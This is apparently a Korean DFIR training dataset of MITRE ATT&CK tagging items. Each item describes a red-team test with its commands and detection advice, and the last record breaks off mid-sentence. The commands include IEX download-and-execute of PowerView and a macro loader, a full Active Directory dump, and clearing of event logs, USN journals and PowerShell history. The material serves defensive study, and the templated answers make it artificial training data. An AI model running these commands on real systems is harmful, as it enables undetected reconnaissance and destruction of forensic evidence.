{"id": "T1069.002_5a8a181c-2c8e-478d-a943-549305a01230_Q13", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1069.002 Permission Groups Discovery: Domain Groups (Tactic: Discovery)\n[요약] PowerView의 Get-DomainGroup을 사용해 도메인 내 그룹 전체를 나열하고, 속성을 함께 출력한다.\n[절차] 1) PowerShell에서 TLS 설정 후, PowerView.ps1을 IEX로 메모리에 로드한다. 2) Get-DomainGroup -verbose 명령을 실행한다. 3) 도메인 내 그룹 전체 목록과 각 그룹의 다양한 속성이 출력된다. 4) 공격자는 이름/설명/스코프 등으로 고권한 그룹을 식별하고, 추가적으로 Get-DomainGroupMember와 연동해 멤버까지 분석할 수 있다. 5) 방어자는 도메인 그룹 전체를 한 번에 긁어가는 LDAP 쿼리 패턴을 이상 징후로 간주할 수 있다.\n[대표 명령 예시]\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose", "answer": "이 행위는 MITRE ATT&CK의 T1069.002 \"Permission Groups Discovery: Domain Groups\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1069.002_22cf8cb9-adb1-4e8c-80ca-7c723dfc8784_Q14", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1069.002 Permission Groups Discovery: Domain Groups (Tactic: Discovery)\n[요약] LDIFDE.exe를 사용해 AD 디렉터리 객체를 subtree 범위로 덤프하여 파일로 저장한다. 그룹뿐 아니라 다양한 AD 객체를 한 번에 추출할 수 있다.\n[절차] 1) 사전 단계에서 ActiveDirectory 모듈이 설치되어 있는지 확인하고, 없는 경우 RSAT-AD-PowerShell 또는 Windows Capability를 통해 설치한다. 2) 관리자 권한 PowerShell 또는 cmd에서 ldifde.exe -f #{output_path}\\#{output_file} -p subtree 명령을 실행한다. 3) AD 전체(subtree)를 탐색해 LDIF 포맷으로 객체 정보를 덤프하고, 지정된 파일에 저장한다. 4) 공격자는 이 LDIF 파일을 오프라인에서 분석하며, 그룹·사용자·컴퓨터·OU 구조 전체를 상세하게 파악할 수 있다. 5) 방어자는 LDIFDE 실행과 대용량 AD export 시도를 중요 이벤트로 간주하여 모니터링 및 알림을 설정해야 한다. 6) 테스트 종료 후 cleanup_command를 통해 덤프 파일을 삭제할 수 있다.\n[대표 명령 예시]\nldifde.exe -f #{output_path}\\#{output_file} -p subtree", "answer": "이 행위는 MITRE ATT&CK의 T1069.002 \"Permission Groups Discovery: Domain Groups\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070_b4115c7a-0e92-47f0-a61e-17e7218b2435_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070 Indicator Removal on Host (Tactic: Defense Evasion)\n[요약] fsutil usn deletejournal /D C: 명령을 사용해 C: 드라이브의 USN Change Journal 전체를 삭제함으로써, 파일 변경 이력을 통째로 제거한다.\n[절차] 1) 관리자 권한으로 명령 프롬프트(cmd.exe)를 실행한다. 2) 다음 명령을 실행한다:    fsutil usn deletejournal /D C:    - /D 옵션: 지정된 볼륨(C:)의 USN Change Journal 전체 삭제.    - 성공 시 별다른 출력 없이 조용히 종료되는 경우가 많다. 3) 이 동작으로 인해 해당 볼륨에서 과거에 기록된 파일 생성/수정/삭제 이력이 USN 저널에서 사라진다. 4) 공격자는 이 방법으로 랜섬웨어, 데이터 유출, 임시 파일 생성/삭제와 같은 악성 행위 흔적을 포렌식 분석자가 USN 기반으로 추적하지 못하게 만들 수 있다. 5) 방어 관점:    - fsutil usn deletejournal 호출 자체를 명령줄 로깅(예: Sysmon, EDR)으로 모니터링한다.    - USN 저널이 비정상적으로 재생성되는 패턴(짧은 간격의 deletejournal → createjournal)을 탐지 포인트로 삼을 수 있다. 6) 복구(테스트의 cleanup 단계):    - fsutil usn createjournal m=1000 a=100 c:    - 최소 크기(m)와 할당 단위(a)를 설정하여 새 USN 저널을 생성하지만, 과거 이력은 복구할 수 없다.\n[대표 명령 예시]\nfsutil usn deletejournal /D C:", "answer": "이 행위는 MITRE ATT&CK의 T1070 \"Indicator Removal on Host\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070_96e86706-6afd-45b6-95d6-108d23eaf2e9_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070 Indicator Removal on Host (Tactic: Defense Evasion)\n[요약] fsutil file setZeroData를 이용해 특정 파일의 데이터 구간을 0으로 덮어써 파일 내용을 부분적으로 삭제·조작함으로써 흔적을 지운다.\n[절차] 1) PowerShell을 실행한다(일반 사용자 권한으로도 수행 가능). 2) 사전 준비:    - if (-not (Test-Path \"#{file_to_manipulate}\")) { New-Item \"#{file_to_manipulate}\" -Force } 명령으로 대상 파일이 없으면 생성한다.    - echo \"1234567890\" > \"#{file_to_manipulate}\" 명령으로 파일에 샘플 데이터를 기록한다. 3) 핵심 조작:    - fsutil file setZeroData offset=0 length=#{file_data_length} \"#{file_to_manipulate}\"    - offset=0: 파일의 시작 위치(0 바이트 지점)부터    - length=#{file_data_length}: 지정된 길이만큼(기본: 10바이트)을 0으로 채운다. 4) 결과:    - 파일 앞부분 데이터(예: 처음 10바이트)가 전부 0으로 덮여써지며, 원래 문자열/바이너리 내용이 훼손된다.    - 공격자는 로그 파일, 설정 파일, 임시 데이터 등에서 자신과 관련된 구간만 선택적으로 지워 증거를 불완전하게 만들 수 있다. 5) 포렌식 관점:    - 파일 길이와 타임스탬프는 유지될 수 있지만, 내용 일부가 0으로 채워진 비정상 패턴이 나타난다.    - 타임라인상 의심 시점 직후 특정 파일의 헤더/앞부분이 0으로 변한 것처럼 보이면, setZeroData·수동 덮어쓰기 등을 의심할 수 있다. 6) 방어 관점:    - fsutil file setZeroData 호출을 명령줄/PowerShell 스크립트 블록 로그로 모니터링한다.    - 특정 보안·로그 파일에 대해 setZeroData가 수행된 흔적을 정기 점검하거나, 무결성 보호(무결성 모니터링/Write 보호)를 적용한다. 7) 테스트 종료 후 cleanup:    - rm \"#{file_to_manipulate}\" 명령으로 테스트 파일을 삭제하여 환경을 정리한다.\n[대표 명령 예시]\nif (-not (Test-Path \"#{file_to_manipulate}\")) { New-Item \"#{file_to_manipulate}\" -Force }\necho \"1234567890\" > \"#{file_to_manipulate}\"\nfsutil  file setZeroData offset=0 length=#{file_data_length} \"#{file_to_manipulate}\"", "answer": "이 행위는 MITRE ATT&CK의 T1070 \"Indicator Removal on Host\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.001_e6abb60e-26b8-41da-8aae-0c35174b0967_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.001 Indicator Removal on Host: Clear Windows Event Logs (Tactic: Defense Evasion)\n[요약] wevtutil cl #{log_name} 명령을 사용해 지정한 Windows 이벤트 로그(기본: System)를 완전히 비운다.\n[절차] 1) 관리자 권한으로 명령 프롬프트(cmd.exe)를 실행한다. 2) 기본 테스트(시스템 로그 삭제)인 경우 다음 명령을 실행한다:    wevtutil cl System    - 여기서 System 대신 Application, Security, Microsoft-Windows-PowerShell/Operational 등 다른 로그 이름을 넣을 수 있다. 3) 명령이 성공하면 화면에 별다른 출력이 없거나 간단한 상태 메시지만 표시된다. 4) 검증:    - 이벤트 뷰어(eventvwr.msc)를 열고, \"Windows 로그 → System\"을 선택한다.    - 또는 C:\\Windows\\System32\\winevt\\Logs\\System.evtx 파일을 확인하면, 이벤트 개수가 0 또는 극히 적은 상태로 초기화된 것을 확인할 수 있다. 5) 공격자 관점:    - 특정 시점 이전의 이벤트(예: 서비스 설치, 계정 사용, 네트워크 접속, 권한 상승 시도)를 지워 조사자가 타임라인을 복원하기 어렵게 만든다. 6) 방어/포렌식 관점:    - Event ID 1102(Security 로그: 감사 로그 지우기) 등 로그 삭제 이벤트를 별도 저장소/중앙 SIEM으로 실시간 전송하는 것이 중요하다.    - wevtutil cl 명령 실행 기록을 명령줄 로깅(Sysmon, EDR)으로 모니터링해 이상 징후로 탐지할 수 있다.\n[대표 명령 예시]\nwevtutil cl #{log_name}", "answer": "이 행위는 MITRE ATT&CK의 T1070.001 \"Indicator Removal on Host: Clear Windows Event Logs\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.001_b13e9306-3351-4b4b-a6e8-477358b0b498_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.001 Indicator Removal on Host: Clear Windows Event Logs (Tactic: Defense Evasion)\n[요약] PowerShell의 Get-EventLog와 Clear-EventLog를 사용해, 시스템 내의 클래식 이벤트 로그들(Application, System, Security 등)을 일괄 초기화한다.\n[절차] 1) 관리자 권한으로 PowerShell을 실행한다. 2) 다음 스크립트를 실행한다:    $logs = Get-EventLog -List | ForEach-Object {$_.Log}    $logs | ForEach-Object {Clear-EventLog -LogName $_ }    Get-EventLog -list    - Get-EventLog -List: 현재 시스템에서 사용 가능한 '클래식' 이벤트 로그 목록을 가져온다.    - Clear-EventLog -LogName $_: 각 로그에 대해 이벤트를 삭제한다.    - 마지막 Get-EventLog -List: 삭제 후 각 로그의 현재 상태(레코드 개수 등)를 출력한다. 3) 실행 결과:    - 콘솔에 각 로그명이 출력되며, 삭제 후 레코드 개수가 0 혹은 매우 적은 값으로 보인다. 4) 검증:    - 이벤트 뷰어에서 Security.evtx, System.evtx, Application.evtx 등 주요 로그의 이벤트 수가 초기화된 것을 확인할 수 있다. 5) 공격자 관점:    - 한 번에 여러 로그를 지워 침입 흔적, 툴 실행, 계정 사용, 네트워크 연결 등 대다수 증거를 동시에 제거한다. 6) 방어/포렌식 관점:    - 짧은 시간 내 여러 로그가 동시에 비워진 패턴을 SIEM·EDR에서 룰로 탐지한다.    - 중앙 집중형 로그 수집(윈도우 이벤트를 실시간으로 원격 서버에 전송)으로 로컬 삭제를 무력화할 수 있다.\n[대표 명령 예시]\n$logs = Get-EventLog -List | ForEach-Object {$_.Log}\n$logs | ForEach-Object {Clear-EventLog -LogName $_ }\nGet-EventLog -list", "answer": "이 행위는 MITRE ATT&CK의 T1070.001 \"Indicator Removal on Host: Clear Windows Event Logs\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.001_1b682d84-f075-4f93-9a89-8a8de19ffd6e_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.001 Indicator Removal on Host: Clear Windows Event Logs (Tactic: Defense Evasion)\n[요약] Word VBA 매크로와 WMI(Win32_NTEventLogFile)를 이용해 Security, Backup 이벤트 로그를 삭제한다. Word 프로세스(WINWORD.EXE) 내에서 이벤트 로그 삭제가 수행되도록 시뮬레이션한다.\n[절차] 1) 관리자 권한 PowerShell을 실행한다. 2) 사전 검사(Atomic 테스트에서 자동 수행):    - New-Object -COMObject \"Word.Application\" 으로 Word COM 객체가 정상 생성되는지 확인하고, winword 프로세스를 종료한다. 3) 공격 시나리오 수행:    - [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 로 TLS 설정을 최신 버전으로 맞춘다.    - IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)      → 원격에서 Invoke-MalDoc.ps1 PowerShell 스크립트를 내려받아 메모리에서 실행한다.    - Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"      → 지정된 매크로 파일(T1070.001-macrocode.txt)을 Word에 로드하고, ClearLogs 서브루틴을 실행한다. 4) 매크로 동작(개념적):    - VBA 코드에서 WMI 클래스(예: Win32_NTEventLogFile)를 사용해 Security, Backup 이벤트 로그에 접근한다.    - .ClearEventLog() 와 유사한 메서드를 호출해 해당 로그를 비우는 방식으로 구현되어 있다. 5) 결과:    - 실행 후 이벤트 뷰어에서 \"Windows 로그 → 보안(Security)\" 및 관련 Backup 로그를 확인하면, 로그가 비워졌거나 거의 없는 상태가 된다. 6) 공격자 관점:    - 워드 문서(매크로 악성 문서)만 열어도, 사용자가 인지하지 못한 상태에서 이벤트 로그를 삭제할 수 있다.    - Office 프로세스를 이용한 로깅 우회·오용 사례로, T1204.002(사용자 실행)와도 연계된 공격 패턴이다. 7) 방어/포렌식 관점:    - Office 프로세스에서 WMI를 통해 이벤트 로그에 접근하는 행위를 EDR에서 의심 행위로 탐지할 수 있다.    - 매크로 실행 정책을 '기본 차단'으로 두고, 서명된 매크로만 허용하는 등 보안 설정 강화가 필요하다.    - 중요 서버에서는 로컬 이벤트 로그뿐만 아니라, 중앙 로그 서버/집중형 SIEM으로 실시간 복제하여 로컬 삭제 영향 최소화.\n[대표 명령 예시]\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"", "answer": "이 행위는 MITRE ATT&CK의 T1070.001 \"Indicator Removal on Host: Clear Windows Event Logs\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.003_2f898b81-3e97-4abb-bc3f-a95138988370_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.003 Indicator Removal on Host: Clear Command History (Tactic: Defense Evasion)\n[요약] PSReadLine 옵션을 변경해 현재/향후 PowerShell 세션에서 명령 히스토리가 파일에 저장되지 않도록 한다. 공격자는 이후 수행할 악성 명령이 히스토리에 기록되지 않게 하기 위해 사용할 수 있다.\n[절차] 1) 일반 사용자 또는 관리자 권한 PowerShell을 실행한다. 2) 아래 명령을 실행해 히스토리 저장 방식을 '아무것도 저장하지 않음(SaveNothing)'으로 변경한다.    Set-PSReadlineOption -HistorySaveStyle SaveNothing    - 기존: SaveIncrementally(기본값) 또는 SaveAtExit 등의 방식으로 HistorySavePath에 명령이 순차 저장됨.    - 변경 후: 명령을 입력해도 PowerShell 히스토리 파일에 기록되지 않는다. 3) 테스트:    - 여러 명령(예: whoami, ipconfig, netstat 등)을 수행한 뒤 PowerShell을 종료한다.    - (Get-PSReadlineOption).HistorySavePath 경로의 파일을 확인하면, 새로 실행한 명령들이 저장되지 않은 것을 볼 수 있다. 4) 공격자 관점:    - 이후 수행할 다운로드, 계정 생성, 권한 상승 등의 명령이 히스토리 파일에 남지 않아, 디스크 기반 포렌식에서 추적이 어려워진다. 5) 방어/포렌식 관점:    - PSReadLine 옵션 변경(Set-PSReadlineOption -HistorySaveStyle SaveNothing)을 로그/EDR에서 이상 징후로 모니터링한다.    - 중앙집중형 명령 로깅(콘솔 이벤트 로깅, PowerShell Transcription, Script Block Logging 등)을 함께 활성화해 우회하기 어렵도록 설계한다.\n[대표 명령 예시]\nSet-PSReadlineOption -HistorySaveStyle SaveNothing", "answer": "이 행위는 MITRE ATT&CK의 T1070.003 \"Indicator Removal on Host: Clear Command History\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.003_da75ae8d-26d6-4483-b0fe-700e4df4f037_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.003 Indicator Removal on Host: Clear Command History (Tactic: Defense Evasion)\n[요약] Get-PSReadLineOption으로 현재 PowerShell 히스토리 파일 경로를 확인하고, 해당 파일 자체를 삭제하여 과거 명령 기록을 제거한다.\n[절차] 1) PowerShell을 실행한다(일반 사용자 또는 관리자). 2) 현재 히스토리 파일 경로를 확인해본다:    (Get-PSReadlineOption).HistorySavePath    - 예: C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt 3) 다음 명령으로 해당 파일을 삭제한다:    Remove-Item (Get-PSReadlineOption).HistorySavePath 4) 삭제 후 확인:    - 위 경로의 파일이 삭제되었는지 확인한다.    - 새 PowerShell 세션을 열면, 이후 다시 히스토리 파일이 생성될 수 있다(기본 동작). 5) 공격자 관점:    - 과거에 실행한 공격 관련 명령(예: 다운로드, 계정 조작, 서비스 생성)을 지워 흔적을 최소화한다. 6) 방어/포렌식 관점:    - 히스토리 파일 삭제(Remove-Item + HistorySavePath)를 EDR/파일 감사 정책으로 탐지할 수 있다.    - 정기적으로 히스토리 파일을 백업하거나, 중앙 시스템으로 명령 이력을 전송하는 구조를 함께 고려한다.\n[대표 명령 예시]\nRemove-Item (Get-PSReadlineOption).HistorySavePath", "answer": "이 행위는 MITRE ATT&CK의 T1070.003 \"Indicator Removal on Host: Clear Command History\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.003_1d0d9aa6-6111-4f89-927b-53e8afae7f94_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.003 Indicator Removal on Host: Clear Command History (Tactic: Defense Evasion)\n[요약] PSReadLine의 AddToHistoryHandler 훅을 이용해, 현재 세션에서 입력되는 모든 명령에 대해 \"히스토리에 추가하지 않는다(return $false)\"로 설정하여 히스토리 파일에 아무 것도 기록되지 않게 한다.\n[절차] 1) PowerShell을 실행한다. 2) 아래 명령으로 AddToHistoryHandler를 재정의한다:    Set-PSReadLineOption -AddToHistoryHandler { return $false }    - AddToHistoryHandler는 매 명령 실행 시 $line(현재 명령 문자열)을 입력으로 받아,      $true를 반환하면 히스토리에 기록, $false를 반환하면 기록하지 않도록 동작한다.    - 여기서는 모든 명령에 대해 $false를 반환하여 한 줄도 기록되지 않도록 한다. 3) 이후 여러 명령을 입력한 뒤, PowerShell 히스토리를 조회해본다:    - Get-History 또는 화살표 키(↑)로 이전 명령을 확인했을 때 아무 것도 나오지 않거나, 이전 세션 명령만 있는 상태를 볼 수 있다. 4) 세션 종료 또는 원복:    - 아래 명령으로 핸들러를 제거하여 기본 동작으로 돌릴 수 있다:      Set-PSReadLineOption -AddToHistoryHandler $null 5) 공격자 관점:    - 현재 세션에서 수행하는 모든 명령이 히스토리에 남지 않으므로, 일시적인 작업(다운로드, 인메모리 실행, 크리덴셜 덤프 등)을 은닉하는 데 유용하다. 6) 방어/포렌식 관점:    - Set-PSReadLineOption -AddToHistoryHandler 호출을 로그/EDR로 모니터링한다.    - 이 훅 기반 우회를 고려해 PowerShell Script Block Logging, Transcription, 콘솔 출력 캡처 등 다계층 로깅 전략을 설계해야 한다.\n[대표 명령 예시]\nSet-PSReadLineOption -AddToHistoryHandler { return $false }", "answer": "이 행위는 MITRE ATT&CK의 T1070.003 \"Indicator Removal on Host: Clear Command History\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.003_22c779cd-9445-4d3e-a136-f75adbf0315f_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.003 Indicator Removal on Host: Clear Command History (Tactic: Defense Evasion)\n[요약] Clear-History cmdlet을 사용하여 현재 PowerShell 세션에서 기록된 명령 히스토리를 모두 제거한다. 이는 세션 기반 히스토리(메모리 상)를 지우는 동작이다.\n[절차] 1) PowerShell을 실행하고, 몇 가지 명령을 일부러 수행한다:    예) whoami, ipconfig, Get-Process 등 2) 히스토리를 확인해본다:    Get-History    - 지금까지 입력한 명령 목록이 출력되는 것을 확인한다. 3) 아래 명령으로 현재 세션 히스토리를 모두 삭제한다:    Clear-History 4) 다시 히스토리를 조회한다:    Get-History    - 아무 항목도 나오지 않거나, 특정 예외적인 항목만 남아있는 것을 확인할 수 있다. 5) 공격자 관점:    - 한 세션 안에서 실수로 입력한 명령이나, 눈에 띄는 공격 명령을 지워 포렌식 분석을 어렵게 만든다. 6) 방어/포렌식 관점:    - Clear-History 명령 실행 자체를 감사/EDR에서 이벤트로 수집하고, 의심스러운 세션으로 분류할 수 있다.    - PowerShell 콘솔 히스토리 외에도, Script Block Logging·Transcription·EDR Command Line Logging 등 여러 소스를 통합 분석해야 한다.\n[대표 명령 예시]\nClear-History", "answer": "이 행위는 MITRE ATT&CK의 T1070.003 \"Indicator Removal on Host: Clear Command History\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.004_861ea0b4-708a-4d17-848d-186c9c7f17e3_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.004 Indicator Removal on Host: File Deletion (Tactic: Defense Evasion)\n[요약] cmd.exe에서 del 명령을 사용해 %TEMP% 경로의 임의 파일을 강제 삭제한다. 공격자는 실행 후 남는 드롭 파일·배치 파일·툴을 빠르게 지우는 용도로 활용할 수 있다.\n[절차] 1) 프리리퀴짓(get_prereq_command)을 실행해 테스트용 파일을 생성한다.    - echo deleteme_T1551.004 >> #{file_to_delete} 2) 생성 여부를 확인한다.    - 예: 탐색기 또는 cmd에서 \"dir %temp%\" 등으로 파일 존재 여부 확인. 3) 아래 명령을 통해 파일을 강제로 삭제한다.    - del /f #{file_to_delete} 4) 삭제 결과 확인:    - 탐색기 또는 \"dir\"로 해당 파일이 더 이상 존재하지 않는지 확인한다. 5) 공격자 관점:    - 드롭한 페이로드, 임시 스크립트, 공격 도구 등을 빠르게 지워 디스크 기반 증거를 최소화하는 데 사용될 수 있음. 6) 방어/포렌식 관점:    - 주요 경로(%TEMP%, 다운로드 폴더, 특정 툴 경로 등)에서의 비정상적인 del /f 활동을 모니터링한다.    - Sysmon/EDR로 삭제 대상 파일 이름 패턴, 프로세스 트리(cmd의 부모 프로세스) 등을 함께 분석한다.\n[대표 명령 예시]\ndel /f #{file_to_delete}", "answer": "이 행위는 MITRE ATT&CK의 T1070.004 \"Indicator Removal on Host: File Deletion\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.004_ded937c4-2add-42f7-9c2c-c742b7a98698_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.004 Indicator Removal on Host: File Deletion (Tactic: Defense Evasion)\n[요약] cmd.exe에서 rmdir /s /q를 사용해 %TEMP% 아래 특정 폴더 전체를 조용히(질문 없이) 삭제한다. 공격자는 작업 폴더 통째로 제거해 아티팩트를 한 번에 없애는 용도로 사용 가능하다.\n[절차] 1) 프리리퀴짓(get_prereq_command)을 실행해 테스트용 폴더를 생성한다.    - mkdir #{folder_to_delete} 2) 탐색기나 dir 명령으로 폴더가 생성되었는지 확인한다. 3) 다음 명령으로 폴더 및 하위 파일 전체를 삭제한다.    - rmdir /s /q #{folder_to_delete}    - /s : 하위 디렉터리와 파일까지 모두 삭제    - /q : 사용자 확인 질문 없이 조용히 실행 4) 삭제 결과 확인:    - 탐색기 또는 dir로 #{folder_to_delete}가 더 이상 존재하지 않는지 확인한다. 5) 공격자 관점:    - C:\\Users\\<user>\\AppData\\Local\\Temp\\<random> 와 같은 작업 폴더를 한 번에 비워 흔적을 줄이려 할 수 있음. 6) 방어/포렌식 관점:    - rmdir /s /q 패턴, 특히 임의/random한 폴더명을 가진 디렉터리에 대한 반복적인 삭제 시도를 모니터링한다.    - 삭제 직전 시점의 프로세스 활동, 네트워크 연결, 새 파일 생성 이벤트와 연계 분석이 필요하다.\n[대표 명령 예시]\nrmdir /s /q #{folder_to_delete}", "answer": "이 행위는 MITRE ATT&CK의 T1070.004 \"Indicator Removal on Host: File Deletion\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.004_9dee89bd-9a98-4c4f-9e2d-4256690b0e72_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.004 Indicator Removal on Host: File Deletion (Tactic: Defense Evasion)\n[요약] PowerShell에서 Remove-Item을 이용해 $env:TEMP 아래 파일을 삭제한다. PowerShell 기반 공격 후 흔적 정리에 자주 쓰이는 패턴이다.\n[절차] 1) 프리리퀴짓(get_prereq_command)으로 테스트용 파일을 생성한다.    - New-Item -Path #{file_to_delete} | Out-Null 2) 파일 존재 여부를 확인한다.    - Test-Path #{file_to_delete} 3) 다음 명령으로 파일을 삭제한다.    - Remove-Item -Path #{file_to_delete} 4) 삭제 후 확인:    - Test-Path #{file_to_delete} 실행 시 False가 반환되는지 확인한다. 5) 공격자 관점:    - PowerShell 스크립트/모듈이 자신의 로깅 파일, 드롭한 툴, 임시 아티팩트를 삭제하는 데 활용할 수 있음. 6) 방어/포렌식 관점:    - Remove-Item 호출을 Script Block Logging/Transcription에서 모니터링하고, 의심 경로(Temp, AppData, Downloads 등)에 대한 삭제를 우선 분석한다.\n[대표 명령 예시]\nRemove-Item -Path #{file_to_delete}", "answer": "이 행위는 MITRE ATT&CK의 T1070.004 \"Indicator Removal on Host: File Deletion\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1070.004_edd779e4-a509-4cba-8dfa-a112543dbfb1_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1070.004 Indicator Removal on Host: File Deletion (Tactic: Defense Evasion)\n[요약] PowerShell Remove-Item -Recurse 옵션으로 폴더와 그 하위 파일/폴더를 모두 삭제한다. 공격자의 작업 디렉터리 전체를 제거하는 전형적인 패턴이다.\n[절차] 1) 프리리퀴짓에서 테스트용 폴더를 생성한다.    - New-Item -Path #{folder_to_delete} -Type Directory | Out-Null 2) 폴더 생성 여부를 확인한다.    - Test-Path #{folder_to_delete} 3) 아래 명령으로 폴더 전체를 재귀적으로 삭제한다.    - Remove-Item -Path #{folder_to_delete} -Recurse 4) 삭제 확인:    - Test-Path #{folder_to_delete} 결과가 False인지 확인. 5) 공격자 관점:    - 모듈, 로그, 임시 캡처 파일, 압축 파일 등을 한 번에 지워 공격 흔적을 줄이기 위해 사용. 6) 방어/포렌식 관점:    - Remove-Item -Recurse 호출과 